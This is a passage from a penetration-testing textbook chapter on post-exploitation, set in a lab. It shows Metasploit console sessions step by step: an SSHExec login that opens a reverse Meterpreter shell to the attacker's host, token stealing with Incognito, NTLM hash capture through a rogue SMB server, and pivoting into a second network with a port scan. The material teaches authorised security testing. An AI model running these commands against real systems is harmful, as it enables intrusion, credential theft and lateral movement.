msf exploit(sshexec) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(sshexec) > set LHOST 192.168.20.9
LHOST => 192.168.20.9
msf exploit(sshexec) > exploit
Post Exploitation 299
[*] Started reverse handler on 192.168.20.9:4444
--snip--
[*] Meterpreter session 10 opened (192.168.20.9:4444 -> 192.168.20.11:36154)
at 2015-03-25 13:43:26 -0400
meterpreter > getuid
Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000,
sgid=1000
meterpreter > shell
Process 21880 created.
Channel 1 created.
whoami
georgia
Listing 13-24: Using SSHExec
In this example, we know the credentials georgia:password from having
cracked them in Chapter 9. Although in this case we will just be logging into
the same host again (similar to what we did in “PSExec” on page 296), we
could use this same technique on other hosts in that same environment
that have an account for georgia.
As with PSExec, we need valid credentials in order to authenticate. We
set the USERNAME to georgia u and PASSWORD to password v, and then choose
linux/x86/meterpreter/reverse_tcp as the payload.
Unlike with PSExec (which uploaded a binary and ran it as a System
service, automatically giving us System privileges), with SSHExec we are
still user georgia. You can see how this exploit could prove to be a quick way
to move around an environment in search of additional information and
vulnerabilities on other Linux systems.
Token Impersonation
Now that we know we might not even need plaintext passwords to gain
access to other systems, is there any case where we may not even need the
password hashes?
One interesting Windows security construct is the concept of tokens.
Tokens are primarily used for access control. Based on the token of a pro-
cess, the operating system can make decisions about which resources and
operations should be made available to it.
Think of a token as a kind of temporary key that gives you access to
certain resources without having to enter your password every time you
want to perform a privileged operation. When a user logs in to the system
interactively, such as directly through the console or from a remote desktop,
a delegation token is created.
Delegation tokens allow the process to impersonate the token on the
local system as well as on the network, for example on other systems in a
domain. Delegation tokens contain credentials and can be used to authen-
ticate with other systems that use these credentials, such as the domain
controller. Tokens persist until reboot, and even if a user logs out, his or her
300 Chapter 13
token will still be present on the system until it shuts down. If we can steal
another token on the system, we can potentially gain additional privileges
and even access to additional systems.
Incognito
We’re on a compromised system: our Windows XP target. Which tokens are
on the system, and how do we steal them? Incognito was originally a stand-
alone tool developed by security researchers conducting research into using
token stealing for privilege escalation, but it has since been added as an
extension to Meterpreter. Incognito will help us enumerate and steal all the
tokens on a system.
Incognito is not loaded into Meterpreter by default, but we can add it
with the load command, as shown here. Use one of your Meterpreter sessions
currently running as system, or use privilege escalation to elevate your access.
(System has access to all tokens on the target.)
meterpreter > load incognito
Loading extension incognito...success.
Before we use Incognito, switch users on your Windows XP target and
log in as secret with the password Password123. This login will create a delega-
tion token on the target for us to impersonate. As we list tokens, Incognito
searches all handles on the system to determine which ones belong to tokens
using low-level Windows API calls. To see all the user tokens available with
the Meterpreter Incognito, enter the command list_tokens -u as shown in
Listing 13-25.
meterpreter > list_tokens -u
Delegation Tokens Available
========================================
BOOKXP\georgia
BOOKXP\secret
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
Listing 13-25: Enumerating tokens with Incognito
We see tokens for both georgia and secret. Let’s try stealing secret’s
delegation token, effectively gaining the privileges of this user. Use the
impersonate_token command to steal the token, as shown in Listing 13-26.
(Note that we use two backslashes to escape the backslash between the
domain—in this case, the local machine name—and the username.)
meterpreter > impersonate_token BOOKXP\\secret
[+] Delegation token available
[+] Successfully impersonated user BOOKXP\secret
Post Exploitation 301
meterpreter > getuid
Server username: BOOKXP\secret
Listing 13-26: Stealing a token with Incognito
Having stolen secret’s token, if we run getuid we should see that we are
effectively now the user secret. This can be especially interesting when in a
domain: If secret is a domain administrator, we are now a domain adminis-
trator as well, and we can do things like create a new domain administrator
account or change the domain administrator’s password. (We’ll look at how
to add accounts from the command line in “Persistence” on page 309.)
SMB Capture
Let’s look at one more interesting consequence of token stealing. In a
domain, password hashes for domain users are stored only on the domain
controller, which means that running a hashdump on an exploited system
will give us password hashes only for local users. We don’t have a domain
set up, so secret’s password hash is stored locally, but imagine that secret is
instead a domain user. Let’s look at a way of capturing the password hashes
without gaining access to the domain controller by passing the hash to an
SMB server we control and recording the results.
Open a second instance of Msfconsole, and use the module auxiliary/
server/capture/smb to set up an SMB server and capture any authentication
attempts. Like the client-side attack modules we studied in Chapter 10, this
module does not directly attack another system; it just sets up a server and
waits. Set up the module options as shown in Listing 13-27.
msf > use auxiliary/server/capture/smb
msf auxiliary(smb) > show options
Module options (auxiliary/server/capture/smb):
Name Current Setting Required Description
---- --------------- -------- -----------
CAINPWFILE no The local filename to store the hashes in Cain&Abel
format
CHALLENGE 1122334455667788 yes The 8 byte challenge
JOHNPWFILE no The prefix to the local filename to store the hashes
in JOHN format
SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address
on the local machine or 0.0.0.0
SRVPORT 445 yes The local port to listen on.
SSL false no Negotiate SSL for incoming connections
SSLCert no Path to a custom SSL certificate (default is
randomly generated)
SSLVersion SSL3 no Specify the version of SSL that should be used
(accepted: SSL2, SSL3, TLS1)
msf auxiliary(smb) > set JOHNPWFILE /root/johnfileu
JOHNPWFILE => johnfile
msf auxiliary(smb) > exploit
Listing 13-27: Using the SMB capture module
302 Chapter 13
You can save the results to a CAINPWFILE or a JOHNPWFILE, which
will save the captured hashes in the formats expected by the Cain and
Abel password tool for Windows and John the Ripper, respectively. Let’s
set it to JOHNPWFILE u because we learned how to use John in Chapter 9.
Now return to your Meterpreter session where you impersonated secret’s
token in the previous section, and drop to a shell, as shown next. Because
we’ve stolen secret’s token, this shell should be running as secret. Knowing
that delegation tokens include credentials to authenticate with other sys-
tems, we’ll use the net use Windows command to attempt to authenticate
with our fake SMB capture server.
Connect to any share you like on the Kali SMB server. The login will
fail, but the damage will be done.
meterpreter > shell
C:\Documents and Settings\secret>net use \\192.168.20.9\blah
Returning to your SMB Capture Msfconsole window, you should see
that you’ve captured a set of password hashes.
[*] SMB Captured - 2015-08-14 15:11:16 -0400
NTLMv1 Response Captured from 192.168.20.10:1078 – 192.168.20.10
USER:secret DOMAIN:BOOKXP OS:Windows 2002 Service Pack 3 2600 LM:Windows 2002 5.1
LMHASH:76365e2d142b5612338deca26aaee2a5d6f3460500532424
NTHASH:f2148557db0456441e57ce35d83bd0a27fb71fc8913aa21c
note This exercise can be a bit flaky, particularly without a Windows domain present. You
might have trouble capturing the hash and instead get something like this:
[*] SMB Capture - Empty hash captured from 192.168.20.10:1050 - 192.168.20.10
captured, ignoring ...
This is a common issue. Just try to understand the concepts so you can try them in
client environments where Windows domains are deployed.
The results are saved in the proper format in the JOHNPWFILE
Metasploit module option for auxiliary/server/capture/smb. For example,
since we set our JOHNPWFILE as /root/johnfile, the file to feed into John is
/root/johnfile_netntlm. When you compare the hashes to those dumped with
hashdump in Listing 13-22, you’ll see that the hashes for secret differ. What’s
going on? As it turns out, these hashes are for NETLM and NETNTLM,
which are a bit different than the regular LM and NTLM Windows hashes
we worked with in Chapter 9. And when you look at the JOHNPWFILE, you’ll
see that its format is a bit different from what we’ve seen previously with
John the Ripper.
secret::BOOKXP:76365e2d142b5612338deca26aaee2a5d6f3460500532424:f2148557db0456
441e57ce35d83bd0a27fb71fc8913aa21c:1122334455667788
Post Exploitation 303
In particular, the hash entry has taken note of the CHALLENGE option set
in Metasploit. Though the user secret has a local hash on our Windows XP
target that would save us the trouble of cracking NETLM and NETNTLM
hashes, this is a useful trick for grabbing password hashes when working
with domain user accounts, which store their password hashes only on the
domain controllers.
Pivoting
Now let’s see if we can use access to a system to gain access to another net-
work entirely. Typically an organization has only a few Internet-facing sys-
tems—hosting services that need to be made available to the Internet such
as web servers, email, VPNs, and so on. These services may be hosted by a
provider such as Google or GoDaddy, or they may be hosted in house. If
they are hosted in house, gaining access to them from the Internet may give
you access to the internal network. Ideally their internal network will be seg-
mented by business unit, level of sensitivity, and so on, such that access to one
machine does not give direct network access to all machines in the enterprise.
note Internet-facing systems may be dual homed, or a member of multiple networks, namely
the Internet and an internal network. A security best practice is to keep dual-homed
systems segregated from sensitive internal network resources in a demilitarized zone,
but I have performed penetration tests for clients who have Internet-facing systems as
part of their internal domain. All I had to do was exploit their web application, which
had a default password for the administrative account, and upload a PHP shell as we
did to XAMPP in Chapter 8, and suddenly I had access to a system on their internal
domain. Hopefully, most of your clients will require a few more steps between piercing
the perimeter and domain access.
When we set up our Windows 7 target in Chapter 1, we gave it two virtual
network adapters. We connected one to the bridged network where it could
talk to the other targets and our Kali virtual machine. The other virtual
adapter is connected to the host-only network. For this exercise, switch the
Windows XP target to the host-only network so it is no longer accessible by
the Kali system. (For more information on changing virtual network settings,
see “Creating the Windows 7 Target” on page 48.)
Though this is a Windows system, Meterpreter allows us to use the
ifconfig command to see networking information. As shown in Listing 13-28,
the Windows 7 target is part of two networks: the 192.168.20.0/24 network,
which also includes our Kali system, and the 172.16.85.0/24 network, which
our Kali system does not have access to.
meterpreter > ifconfig
Interface 11
============
Name : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:62:d5:c8
MTU : 1500
IPv4 Address : 192.168.20.12
304 Chapter 13
IPv4 Netmask : 255.255.255.0
Interface 23
============
Name : Intel(R) PRO/1000 MT Network Connection #2
Hardware MAC : 00:0c:29:62:d5:d2
MTU : 1500
IPv4 Address : 172.16.85.191
IPv4 Netmask : 255.255.255.0
Listing 13-28: Dual-homed system networking information
We can’t attack any systems in the 172.16.85.0 network directly from
Kali. However, because we have access to the Windows 7 target, we can use
it as a jumping-off point, or pivot, to further explore this second network, as
shown in Figure 13-3.
Kali Windows 7
192.168.20.9 192.168.20.12
172.16.85.191
Windows XP
172.16.85.190
Figure 13-3: Pivoting through an exploited system
At this point we could start uploading our hack tools to the Windows 7
target to begin the penetration test on the 172.16.85.0 network, but that
attempt would likely be caught by antivirus software, and we’d have to clean
up the mess left behind. Metasploit gives us another option: We can route
all of the traffic for our target network through an open Metasploit session.
Adding a Route in Metasploit
The route command in Metasploit tells Metasploit where to route traffic.
Instead of routing traffic to an IP address, we send traffic destined for a net-
work through a specific open session. In this case, we want to send all traf-
fic headed to the 172.16.85.0 network through the Windows 7 session. The
syntax for the route command in Metasploit is route add network 
.
msf > route add 172.16.85.0 255.255.255.0 2
Post Exploitation 305
Now any traffic we send from Metasploit to the 172.16.85.0 network will
automatically be routed through the Windows 7 session (session 2 in my
case). We can set options such as RHOST or RHOSTS to systems in this network,
and Metasploit will get traffic to the right place.
Metasploit Port Scanners
One of the first things we did when information gathering in Chapter 5 was
to port scan our targets with Nmap. We won’t be able to use external tools
with our Metasploit route, but luckily Metasploit has some port-scanning
modules we can use instead, like the scanner/portscan/tcp module, which will
perform a simple TCP port scan, as shown in Listing 13-29.
msf > use scanner/portscan/tcp
msf auxiliary(tcp) > show options
Module options (auxiliary/scanner/portscan/tcp):
Name Current Setting Required Description
---- --------------- -------- -----------
CONCURRENCY 10 yes The number of concurrent ports to check per host
PORTS u1-10000 yes Ports to scan (e.g. 22-25,80,110-900)
RHOSTS yes The target address range or CIDR identifier
THREADS 1 yes The number of concurrent threads
TIMEOUT 1000 yes The socket connect timeout in milliseconds
msf auxiliary(tcp) > set RHOSTS 172.16.85.190
rhosts => 172.16.85.190
msf auxiliary(tcp) > exploit
[*] 172.16.85.190:25 - TCP OPEN
[*] 172.16.85.190:80 - TCP OPEN
[*] 172.16.85.190:139 - TCP OPEN
[*] 172.16.85.190:135 - TCP OPEN
[*] 172.16.85.190:180 - TCP OPEN